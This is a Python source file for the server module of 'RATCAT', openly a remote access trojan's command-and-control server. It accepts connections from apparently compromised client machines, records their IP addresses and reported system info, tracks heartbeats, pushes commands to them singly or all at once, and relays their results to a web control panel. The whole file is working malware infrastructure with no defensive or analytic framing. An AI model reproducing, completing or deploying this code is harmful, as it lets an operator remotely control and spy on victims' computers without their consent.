#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
RATCAT - Server Module
Developed by: zaax
"""

import socket
import threading
import json
import time
import base64
from datetime import datetime

class RATServer:
    """WebSocket server for RATCAT"""
    
    def __init__(self, host, port, controller):
        self.host = host
        self.port = port
        self.controller = controller
        self.socket = None
        self.running = False
        self.clients = {}
        self.client_counter = 0
        
    def start(self):
        """Start the server"""
        self.running = True
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(50)
            
            while self.running:
                try:
                    client, addr = self.socket.accept()
                    self.client_counter += 1
                    client_id = f"RAT_{self.client_counter}_{int(time.time())}"
                    
                    # Store client
                    self.clients[client_id] = {
                        'socket': client,
                        'ip': addr[0],
                        'connected': True,
                        'info': {},
                        'last_heartbeat': time.time()
                    }
                    self.controller.clients[client_id] = self.clients[client_id]
                    
                    # Start handler thread
                    thread = threading.Thread(target=self.handle_client, args=(client_id,))
                    thread.daemon = True
                    thread.start()
                    
                    print(f"[+] Client connected: {client_id} from {addr[0]}")
                    
                except Exception as e:
                    if self.running:
                        print(f"[-] Error accepting client: {e}")
                    break
                    
        except Exception as e:
            print(f"[-] Server error: {e}")
        finally:
            self.stop()
    
    def handle_client(self, client_id):
        """Handle client connection"""
        client = self.clients.get(client_id)
        if not client:
            return
        
        sock = client['socket']
        
        try:
            while self.running and client['connected']:
                # Receive message
                data = sock.recv(4096).decode()
                if not data:
                    break
                
                message = json.loads(data)
                self.process_message(client_id, message)
                
        except Exception as e:
            print(f"[-] Client {client_id} error: {e}")
        finally:
            client['connected'] = False
            if client_id in self.controller.clients:
                del self.controller.clients[client_id]
            sock.close()
            print(f"[-] Client disconnected: {client_id}")
    
    def process_message(self, client_id, message):
        """Process incoming message from client"""
        msg_type = message.get('type')
        msg_data = message.get('data', {})
        
        if msg_type == 'info':
            # Update client info
            self.clients[client_id]['info'] = msg_data
            self.controller.clients[client_id]['info'] = msg_data
            
        elif msg_type == 'heartbeat':
            # Update heartbeat
            self.clients[client_id]['last_heartbeat'] = time.time()
            self.send_message(client_id, {'type': 'heartbeat_ack'})
            
        elif msg_type == 'result':
            # Forward result to web panel
            self.controller.web_panel.broadcast({
                'type': 'result',
                'client': client_id,
                'data': msg_data
            })
    
    def send_message(self, client_id, message):
        """Send message to client"""
        client = self.clients.get(client_id)
        if not client or not client['connected']:
            return False
        
        try:
            client['socket'].send(json.dumps(message).encode())
            return True
        except:
            return False
    
    def broadcast(self, message):
        """Broadcast message to all clients"""
        sent = 0
        for client_id in list(self.clients.keys()):
            if self.send_message(client_id, message):
                sent += 1
        return sent
    
    def command(self, client_id, cmd_type, cmd_data=None):
        """Send command to client"""
        message = {
            'type': 'command',
            'data': {
                'command': cmd_type,
                'params': cmd_data or {}
            }
        }
        return self.send_message(client_id, message)
    
    def stop(self):
        """Stop the server"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        
        # Close all client connections
        for client_id in list(self.clients.keys()):
            try:
                self.clients[client_id]['socket'].close()
            except:
                pass
